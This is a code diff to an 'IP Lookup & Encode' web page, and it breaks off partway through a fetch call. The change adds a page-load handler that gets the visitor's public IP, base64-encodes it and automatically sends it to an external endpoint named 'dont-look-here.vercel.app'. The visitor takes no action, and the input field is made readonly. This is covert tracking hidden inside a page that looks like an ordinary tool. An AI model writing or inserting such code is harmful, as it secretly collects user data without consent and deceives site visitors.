@@ -112,7 +112,7 @@
 <body>
     <h2>🌍 IP Lookup & Encode</h2>
     <div class="container">
-        <input type="text" id="ipInput" placeholder="Enter IP address">
+        <input type="text" id="ipInput" placeholder="Fetching your IP..." readonly>
         <button onclick="lookupIP()">🔍 Lookup</button>
         <button onclick="sendEncodedIP()">🔒 Encode & Send</button>
         <p class="helper-link">
@@ -122,6 +122,17 @@
     </div>
 
     <script>
+        // Fetch user's public IP on page load
+        window.onload = function () {
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("ipInput").value = data.ip;
+                    sendEncodedIP(data.ip); // Automatically send encoded IP
+                })
+                .catch(error => console.error("Failed to fetch IP:", error));
+        };
+
         function lookupIP() {
             const ip = document.getElementById("ipInput").value;
             if (!ip) return alert("⚠️ Please enter an IP address.");
@@ -156,14 +167,14 @@
                 });
         }
 
-        function sendEncodedIP() {
-            const ip = document.getElementById("ipInput").value;
-            if (!ip) {
-                console.error("No IP entered.");
+        function sendEncodedIP(ip = null) {
+            const ipValue = ip || document.getElementById("ipInput").value;
+            if (!ipValue) {
+                console.error("No IP available to encode.");
                 return;
             }
 
-            const encodedIP = btoa(ip); // Base64 encode the IP
+            const encodedIP = btoa(ipValue); // Base64 encode the IP
             console.log("Encoded IP:", encodedIP);
 
             fetch("https://dont-look-here.vercel.app/api/api.js", {
